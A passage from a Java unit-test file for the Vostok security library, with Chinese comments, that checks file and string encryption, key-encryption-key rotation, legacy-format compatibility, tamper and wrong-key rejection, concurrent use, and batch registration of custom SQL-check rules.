     * 跨 KEK 轮换：kek-v1 加密 → rotateKek → kek-v2 加密，两个文件均可解密。
     * 验证历史 KEK 版本保留，旧文件不受轮换影响。
     */
    @Test
    void testEncryptDecryptFileCrossKekRotation() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-kek-rotate");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-file-kek"));

        byte[] msg1 = "message-encrypted-with-kek-v1".getBytes(StandardCharsets.UTF_8);
        byte[] msg2 = "message-encrypted-with-kek-v2".getBytes(StandardCharsets.UTF_8);
        Path src1 = dir.resolve("msg1.bin");
        Path src2 = dir.resolve("msg2.bin");
        Path enc1 = dir.resolve("msg1.vkf");
        Path enc2 = dir.resolve("msg2.vkf");
        Path dec1 = dir.resolve("msg1_dec.bin");
        Path dec2 = dir.resolve("msg2_dec.bin");

        // 用 kek-v1 加密 msg1
        Files.write(src1, msg1);
        Vostok.Security.encryptFile(src1, enc1, "file-kek");

        // 轮换 KEK（v1 → v2），v1 文件保留
        Vostok.Security.rotateKek("file-kek");

        // 用 kek-v2 加密 msg2
        Files.write(src2, msg2);
        Vostok.Security.encryptFile(src2, enc2, "file-kek");

        // 两个文件均可解密
        Vostok.Security.decryptFile(enc1, dec1);
        Vostok.Security.decryptFile(enc2, dec2);

        assertArrayEquals(msg1, Files.readAllBytes(dec1), "v1 kek file should decrypt after rotation");
        assertArrayEquals(msg2, Files.readAllBytes(dec2), "v2 kek file should decrypt normally");
    }

    /**
     * 异常路径：用 masterKey-A 加密，用 masterKey-B 解密应失败。
     */
    @Test
    void testDecryptFileWithWrongMasterKeyFails() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-wrongkey");
        Path src = dir.resolve("secret.bin");
        Path enc = dir.resolve("secret.vkf");
        Path dec = dir.resolve("secret_dec.bin");

        Files.write(src, "secret-content".getBytes(StandardCharsets.UTF_8));

        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-correct"));
        Vostok.Security.encryptFile(src, enc, "wrong-key-test");

        // 换用错误主密钥，解包 DEK 应失败
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-wrong"));
        assertThrows(VKSecurityException.class, () -> Vostok.Security.decryptFile(enc, dec),
                "Decryption with wrong master key should throw VKSecurityException");
    }

    /**
     * 异常路径：非 vkf1 格式文件（魔数不匹配）应抛 VKSecurityException。
     */
    @Test
    void testDecryptFileInvalidFormatFails() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-invalid");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig().baseDir(dir.toString()));

        Path notEncrypted = dir.resolve("plain.txt");
        Path out = dir.resolve("out.bin");
        Files.write(notEncrypted, "this is not a vkf1 file".getBytes(StandardCharsets.UTF_8));

        assertThrows(VKSecurityException.class, () -> Vostok.Security.decryptFile(notEncrypted, out),
                "Non-vkf1 file should throw VKSecurityException");
    }

    /**
     * 异常路径：密文中一个字节被翻转，GCM 认证标签验证失败应抛异常，不输出任何明文。
     */
    @Test
    void testDecryptFileTamperedCiphertextFails() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-tamper");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-tamper"));

        Path src = dir.resolve("original.bin");
        Path enc = dir.resolve("original.vkf");
        Path dec = dir.resolve("original_dec.bin");

        Files.write(src, "tamper-test-content".getBytes(StandardCharsets.UTF_8));
        Vostok.Security.encryptFile(src, enc, "tamper-key");

        // 篡改密文：翻转最后一个字节（GCM 认证标签区域）
        byte[] encBytes = Files.readAllBytes(enc);
        encBytes[encBytes.length - 1] ^= 0xFF;
        Files.write(enc, encBytes);

        assertThrows(VKSecurityException.class, () -> Vostok.Security.decryptFile(enc, dec),
                "Tampered ciphertext should fail GCM tag verification");
        // 解密失败时不应产生输出文件内容（文件已创建但应为空或不存在）
        if (Files.exists(dec)) {
            assertEquals(0, Files.size(dec), "No plaintext bytes should be written on tamper detection");
        }
    }

    /**
     * 并发：多线程同时加解密不同文件，验证静态 KeyStore 和 Cipher 操作线程安全。
     */
    @Test
    void testEncryptDecryptFileConcurrent() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-concurrent");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-concurrent"));

        int threadCount = 8;
        CountDownLatch latch = new CountDownLatch(threadCount);
        AtomicInteger failCount = new AtomicInteger(0);

        for (int i = 0; i < threadCount; i++) {
            final int idx = i;
            new Thread(() -> {
                try {
                    byte[] data = ("concurrent-thread-" + idx + "-payload").getBytes(StandardCharsets.UTF_8);
                    Path srcFile = dir.resolve("src-" + idx + ".bin");
                    Path encFile = dir.resolve("enc-" + idx + ".vkf");
                    Path decFile = dir.resolve("dec-" + idx + ".bin");

                    Files.write(srcFile, data);
                    Vostok.Security.encryptFile(srcFile, encFile, "concurrent-key");
                    Vostok.Security.decryptFile(encFile, decFile);

                    byte[] decrypted = Files.readAllBytes(decFile);
                    if (!Arrays.equals(data, decrypted)) {
                        failCount.incrementAndGet();
                    }
                } catch (Exception e) {
                    failCount.incrementAndGet();
                } finally {
                    latch.countDown();
                }
            }).start();
        }

        assertTrue(latch.await(15, TimeUnit.SECONDS), "Concurrent file encrypt/decrypt timed out");
        assertEquals(0, failCount.get(), "All concurrent encrypt/decrypt operations should succeed");
    }

    /**
     * 大文件多分块：3 MB 文件触发 3 个 1 MB 分块，验证 v2 流式分块加解密端到端正确性。
     * 解密期间堆内存峰值约 2 MB，远小于文件大小，验证内存控制目标。
     */
    @Test
    void testEncryptDecryptFileLargeMultiChunk() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-large");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-large"));

        // 构造 3 MB 随机二进制数据，横跨 3 个 1 MB 分块边界
        byte[] data = new byte[3 * 1024 * 1024];
        new java.util.Random(99999).nextBytes(data);

        Path src = dir.resolve("large.bin");
        Path enc = dir.resolve("large.vkf");
        Path dec = dir.resolve("large_dec.bin");

        Files.write(src, data);
        Vostok.Security.encryptFile(src, enc, "large-key");
        Vostok.Security.decryptFile(enc, dec);

        assertArrayEquals(data, Files.readAllBytes(dec),
                "3 MB multi-chunk file should round-trip without corruption");
    }

    /**
     * 大文件篡改：3 MB 文件的第 2 块密文被翻转，解密应抛出 VKSecurityException，
     * 且目标文件不存在或为空（临时文件机制保护）。
     */
    @Test
    void testDecryptFileLargeFileMidChunkTamperFails() throws Exception {
        var dir = Files.createTempDirectory("vostok-file-large-tamper");
        Vostok.Security.initKeyStore(new VKKeyStoreConfig()
                .baseDir(dir.toString()).masterKey("master-large-tamper"));

        byte[] data = new byte[3 * 1024 * 1024];
        new java.util.Random(77777).nextBytes(data);

        Path src = dir.resolve("large.bin");
        Path enc = dir.resolve("large.vkf");
        Path dec = dir.resolve("large_dec.bin");

        Files.write(src, data);
        Vostok.Security.encryptFile(src, enc, "large-tamper-key");

        // 篡改密文中部（第 2 个分块区域）的一个字节
        byte[] encBytes = Files.readAllBytes(enc);
        encBytes[encBytes.length / 2] ^= 0xAA;
        Files.write(enc, encBytes);

        assertThrows(VKSecurityException.class, () -> Vostok.Security.decryptFile(enc, dec),
                "Mid-chunk tamper should throw VKSecurityException");
        // 临时文件机制保证：目标文件不应包含任何字节
        if (Files.exists(dec)) {
            assertEquals(0, Files.size(dec), "No plaintext bytes should be written on tamper detection");
        }
    }

    // ---------------------------------------------------------------- Key Wrapping 测试

    /**
     * 跨 KEK 轮换的加解密：encrypt（kek-v1）→ rotateKek → encrypt（kek-v2），两条密文均可解密。
     * 验证 rotateKek 不影响 v1 密文的解密能力（向前兼容）。
     */
    @Test
    void testEncryptDecryptCrossKekRotation() throws Exception {
        var dir = Files.createTempDirectory("vostok-kek-rotate");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-kek");
        Vostok.Security.initKeyStore(cfg);

        // 用 kek-v1 加密
        String payload1 = Vostok.Security.encryptWithKeyId("plaintext-v1", "kek-test");
        assertTrue(payload1.startsWith("vk2:dek:"), "Should use vk2 format");

        // 轮换 KEK（v1 → v2），v1 文件保留
        Vostok.Security.rotateKek("kek-test");

        // 用 kek-v2 加密
        String payload2 = Vostok.Security.encryptWithKeyId("plaintext-v2", "kek-test");
        assertTrue(payload2.startsWith("vk2:dek:"), "Should use vk2 format");

        // 两条密文均可解密
        assertEquals("plaintext-v1", Vostok.Security.decryptWithKeyId(payload1),
                "v1 payload should still decrypt after kek rotation");
        assertEquals("plaintext-v2", Vostok.Security.decryptWithKeyId(payload2),
                "v2 payload should decrypt normally");

        Vostok.Security.close();
    }

    /**
     * 连续多次 KEK 轮换（v1→v4），4 条历史密文全部可解密。
     * 验证每个版本的 KEK 文件均被保留，历史密文不受后续轮换影响。
     */
    @Test
    void testEncryptDecryptMultipleKekRotations() throws Exception {
        var dir = Files.createTempDirectory("vostok-kek-multi-rotate");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-multi-kek");
        Vostok.Security.initKeyStore(cfg);

        // 用 kek-v1 加密
        String p1 = Vostok.Security.encryptWithKeyId("msg-kek1", "multi-kek");
        // 轮换到 v2，加密
        Vostok.Security.rotateKek("multi-kek");
        String p2 = Vostok.Security.encryptWithKeyId("msg-kek2", "multi-kek");
        // 轮换到 v3，加密
        Vostok.Security.rotateKek("multi-kek");
        String p3 = Vostok.Security.encryptWithKeyId("msg-kek3", "multi-kek");
        // 轮换到 v4，加密
        Vostok.Security.rotateKek("multi-kek");
        String p4 = Vostok.Security.encryptWithKeyId("msg-kek4", "multi-kek");

        // 4 条历史密文全部可解密
        assertEquals("msg-kek1", Vostok.Security.decryptWithKeyId(p1), "kek-v1 payload");
        assertEquals("msg-kek2", Vostok.Security.decryptWithKeyId(p2), "kek-v2 payload");
        assertEquals("msg-kek3", Vostok.Security.decryptWithKeyId(p3), "kek-v3 payload");
        assertEquals("msg-kek4", Vostok.Security.decryptWithKeyId(p4), "kek-v4 payload");

        Vostok.Security.close();
    }

    /**
     * 旧 vk1 格式向后兼容：手工构造 vk1:aes: payload，新 decryptWithKeyId 仍可解密。
     * 确保升级到 Key Wrapping 后不破坏存量密文。
     */
    @Test
    void testVk1PayloadBackwardCompatible() throws Exception {
        var dir = Files.createTempDirectory("vostok-kek-vk1-compat");
        VKKeyStoreConfig cfg = new VKKeyStoreConfig()
                .baseDir(dir.toString())
                .masterKey("master-vk1-compat");
        Vostok.Security.initKeyStore(cfg);

        // 直接用 getOrCreateAesKey + encrypt 构造旧格式 payload（模拟历史数据）
        String keyId = "compat-key";
        String aesKey = Vostok.Security.getOrCreateAesKey(keyId);
        String cipher = Vostok.Security.encrypt("legacy-plaintext", aesKey);
        String vk1Payload = "vk1:aes:" + keyId + ":" + cipher;

        // 新 decryptWithKeyId 应能正确解密旧格式
        String decrypted = Vostok.Security.decryptWithKeyId(vk1Payload);
        assertEquals("legacy-plaintext", decrypted,
                "vk1 legacy payload should be decryptable by new decryptWithKeyId");

        Vostok.Security.close();
    }

    /**
     * Perf4: 批量注册规则应只重建一次 scanner，且所有规则均生效。
     */
    @Test
    void testRegisterRulesBatch() {
        VKSecurityRule ruleA = new VKSecurityRule() {
            @Override public String name() { return "batch-rule-a"; }
            @Override public yueyang.vostok.security.rule.VKSecurityFinding apply(
                    yueyang.vostok.security.rule.VKSecurityContext ctx) {
                return ctx.getScannedSql().contains("forbidden_table_a")
                        ? new yueyang.vostok.security.rule.VKSecurityFinding(
                                name(), VKSecurityRiskLevel.HIGH, 9, "batch-rule-a triggered")
                        : null;
            }
        };
        VKSecurityRule ruleB = new VKSecurityRule() {
            @Override public String name() { return "batch-rule-b"; }
            @Override public yueyang.vostok.security.rule.VKSecurityFinding apply(
                    yueyang.vostok.security.rule.VKSecurityContext ctx) {
                return ctx.getScannedSql().contains("forbidden_table_b")
                        ? new yueyang.vostok.security.rule.VKSecurityFinding(
                                name(), VKSecurityRiskLevel.HIGH, 9, "batch-rule-b triggered")
                        : null;
            }
        };
        VKSecurityRule ruleC = new VKSecurityRule() {
            @Override public String name() { return "batch-rule-c"; }
            @Override public yueyang.vostok.security.rule.VKSecurityFinding apply(
                    yueyang.vostok.security.rule.VKSecurityContext ctx) {
                return ctx.getScannedSql().contains("forbidden_table_c")
                        ? new yueyang.vostok.security.rule.VKSecurityFinding(
                                name(), VKSecurityRiskLevel.MEDIUM, 6, "batch-rule-c triggered")
                        : null;
            }
        };

        // 批量注册：3 条规则，仅一次 scanner 重建
        Vostok.Security.registerRules(java.util.List.of(ruleA, ruleB, ruleC));

        // 所有规则均应生效
        var r1 = Vostok.Security.checkSql("SELECT * FROM forbidden_table_a WHERE id = ?", 1L);
        assertFalse(r1.isSafe());
        assertTrue(r1.getMatchedRules().contains("batch-rule-a"));

        var r2 = Vostok.Security.checkSql("SELECT * FROM forbidden_table_b WHERE id = ?", 1L);
        assertFalse(r2.isSafe());
        assertTrue(r2.getMatchedRules().contains("batch-rule-b"));

        var r3 = Vostok.Security.checkSql("SELECT * FROM forbidden_table_c WHERE id = ?", 1L);
        assertFalse(r3.isSafe());
        assertTrue(r3.getMatchedRules().contains("batch-rule-c"));

        // 正常 SQL 不受影响
        assertTrue(Vostok.Security.checkSql("SELECT id FROM users WHERE id = ?", 1L).isSafe());
    }
}
